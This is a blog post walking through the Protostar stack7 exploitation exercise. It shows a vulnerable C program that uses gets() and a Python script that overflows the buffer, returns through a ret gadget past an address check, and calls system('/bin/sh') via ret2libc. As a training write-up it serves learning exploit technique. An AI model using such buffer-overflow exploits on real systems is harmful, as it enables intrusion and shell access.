---
layout: post
title: "ret2libc with a gadget: protostar stack7"
date: 2019-4-27
categories: jekyll update
---

This is a pretty similar one to the last, so it should also be a short post.

{% highlight c %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
{% endhighlight %}


The only difference here is that we cannot return to any address that begins in 0xb.

The way we are going to remedy this is with something called a gadget. If you remember from before, we can return into certain functions in code, such as in the last one we returned into system. 

What we are going to do here is return into a ret (the assembly instruction).

Finding this is much easier than searching libc. All we need to do is disassemble the functions in the program.

![stack7-1](/assets/stack7-1.png)
I popped open GDB, and just disassembled the getpath function, in order to find an address we can return to. 

![stack7-2](/assets/stack7-2.png)

It's repetitive, but I find the relevant functions.
![stack7-3](/assets/stack7-3.png)
Then, once more, let's find the /bin/sh string once more, ya know, for practice. 
I found the offset again, but thought I should include the junk above it. This is what you get when you forget to grep. 
So as a not, remember to grep.

Ok cool, we got the address of /bin/sh once again. Basically retracing the steps of the previous challenge, for p r a c t i c e.

![stack7-4](/assets/stack7-4.png)

Once more, let's organize this into a nice crunchy python script. 

{% highlight python %}
from struct import pack

#remember that we have an unsigned int sitting on the stack, so we need to overwrite that, hence why our offset is 80, not 76.
offset = "A" * 80

retaddr = pack("I", 0x8048544)

system = pack("I", 0xb7ecffb0)
exit = pack("I", 0xb7ec60c0)
binsh = pack("I", 0xb7fb63bf)

#get it ready for launch

exploit = offset + retaddr + system + exit + binsh
print exploit
{% endhighlight %}

![stack7-5](/assets/stack7-5.png)
Keep in mind that the file "test" you see is just the output of the script we wrote. 

And also keep in mind that you need to cat in an interactive mode, hence, the "-". I even forget that sometimes. 

So, recap time. What did we learn this time? 
If the eip gets overwritten with the address of an assembly instruction, then we can get that to execute. In our case this was as simple as dodging a protected return address. The return address essentially just pops and the next thing on the stack is then executed. And in doing this, the ret becomes a "gadget".

![ret](/assets/ret.jpg)

This is only scratching the surface of what can be done. I recommend researching "return oriented programming", because it is possible to do something like link together gadgets to effectively do everything that could be accomplished by shellcode or ret2libc. 

While we didn't really do return oriented programming, we did dip our feet in the water, and started exploring it conceptually.